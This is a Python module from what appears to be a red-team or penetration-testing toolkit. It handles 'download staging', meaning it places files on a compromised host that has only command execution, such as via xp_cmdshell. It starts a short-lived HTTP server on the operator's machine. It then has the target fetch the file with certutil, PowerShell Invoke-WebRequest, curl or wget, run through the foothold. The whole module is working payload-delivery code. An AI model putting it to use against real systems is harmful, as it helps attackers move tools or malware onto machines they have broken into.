"""Download-staging — put a file on a target that has no file-transfer transport.

Auto-stage normally rides smb/ssh ``--put-file`` (see :mod:`fieldkit.transport`). A foothold
that only has *command execution* — the classic case being MSSQL ``xp_cmdshell`` — cannot
``--put-file``. So instead fieldkit serves the artifact over HTTP from the operator's box and
has the target fetch it with a native downloader (``certutil`` on Windows, ``curl``/``wget`` on
Linux) run over the exec transport. The fetch+write on the target is a ``config-change`` action,
captured and gated like any other stage; the HTTP serve is attacker-side and short-lived.

The command execution is injected, so the fallback is testable against a real local HTTP
serve without a target.
"""
import contextlib
import http.server
import os
import threading


def render_download(os_name, url, remote):
    """The command that fetches ``url`` to ``remote`` on the target, natively per OS."""
    if os_name == "linux":
        return f"curl -fsSL -o '{remote}' '{url}' || wget -qO '{remote}' '{url}'"
    # windows: certutil is native; fall back to PowerShell's Invoke-WebRequest.
    return (f'certutil -urlcache -split -f "{url}" "{remote}" || '
            f'powershell -c "iwr \'{url}\' -OutFile \'{remote}\'"')


@contextlib.contextmanager
def serve(directory, *, bind="0.0.0.0"):
    """Serve ``directory`` over HTTP on an ephemeral port; yields the port, stops on exit."""
    def handler(*a, **k):
        return http.server.SimpleHTTPRequestHandler(*a, directory=directory, **k)

    httpd = http.server.ThreadingHTTPServer((bind, 0), handler)
    port = httpd.server_address[1]
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    try:
        yield port
    finally:
        httpd.shutdown()
        httpd.server_close()


def download_stage(host, local, remote, *, lhost, execute, on_event=None, bind="0.0.0.0"):
    """Serve ``local`` and have the target fetch it to ``remote`` via ``execute(command)``.

    ``execute(command) -> ExecResult`` runs the fetch command on the target (the CLI wires it
    to :func:`fieldkit.executor.execute` with a ``config-change`` Action, so it's captured and
    records a cleanup artifact). ``lhost`` is the address the target reaches the operator on —
    without it there is no callback, so download-staging is not possible (returns ``None``).
    Returns the fetch :class:`ExecResult`.
    """
    if not lhost:
        return None
    directory = os.path.dirname(os.path.abspath(local))
    name = os.path.basename(local)
    with serve(directory, bind=bind) as port:
        url = f"http://{lhost}:{port}/{name}"
        if on_event:
            on_event(f"  serving {name} on {lhost}:{port} — target fetches → {remote}")
        return execute(render_download(host["os"], url, remote))
